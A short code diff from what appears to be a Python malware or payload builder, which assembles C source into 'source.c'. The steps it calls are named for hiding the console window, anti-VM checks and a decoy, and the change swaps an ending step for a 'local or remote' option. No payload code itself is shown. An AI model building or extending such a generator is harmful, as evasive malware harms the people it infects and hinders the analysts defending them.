@@ -31,7 +31,7 @@ def Construction():
         Final_Code += body.Hide_Window_Console()
         Final_Code += evasion.Anti_VM(FILENAME)
         Final_Code += evasion.Decoil()
-        Final_Code += body.End()
+        Final_Code += body.Local_Or_Remote()
 
         with open('source.c', 'w') as f:
             f.write(Final_Code)
